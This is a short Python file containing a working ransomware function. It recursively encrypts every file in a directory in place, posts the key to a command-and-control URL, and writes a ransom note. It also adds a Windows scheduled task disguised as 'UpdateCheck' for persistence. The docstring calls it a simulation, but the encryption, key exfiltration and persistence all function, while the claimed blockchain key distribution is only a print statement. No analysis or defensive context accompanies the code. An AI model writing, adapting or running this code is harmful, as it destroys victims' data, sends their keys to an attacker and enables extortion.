import os
import base64
from cryptography.fernet import Fernet
import requests
import json
import subprocess

def ransomware_with_blockchain_key_distribution(directory: str, note: str, c2_url: str) -> None:
    """
    This function simulates a ransomware attack by encrypting all files in the specified directory,
    sending the encryption key to a command and control server, distributing the encryption key via blockchain,
    displaying a ransom note, and ensuring persistence.

    :param directory: The path of the directory to encrypt.
    :param note: The ransom note to display to the victim.
    :param c2_url: The URL of the command and control server to send the encryption key.
    """
    # Generate a key for encryption
    key = Fernet.generate_key()
    cipher_suite = Fernet(key)

    # Encrypt all files in the directory
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, 'rb') as f:
                data = f.read()
            encrypted_data = cipher_suite.encrypt(data)
            with open(file_path, 'wb') as f:
                f.write(encrypted_data)

    # Send the encryption key to the C2 server
    response = requests.post(c2_url, json={'key': base64.b64encode(key).decode('utf-8')})
    if response.status_code != 200:
        print("Failed to send key to C2 server")

    # Distribute the encryption key via blockchain (simulated)
    # For simplicity, we'll just print the key to the console
    print(f"Key distributed via blockchain: {base64.b64encode(key).decode('utf-8')}")

    # Create a ransom note file
    with open(os.path.join(directory, 'README.txt'), 'w') as f:
        f.write(note)

    # Ensure persistence by creating a scheduled task
    script_path = os.path.abspath(__file__)
    subprocess.run(['schtasks', '/create', '/tn', 'UpdateCheck', '/tr', f'python "{script_path}"', '/sc', 'daily', '/st', '00:00'], check=True)

# Example usage
# ransomware_with_blockchain_key_distribution('C:\\target_directory', 'Your files have been encrypted. To decrypt them, contact us at...', 'http://example.com/c2')
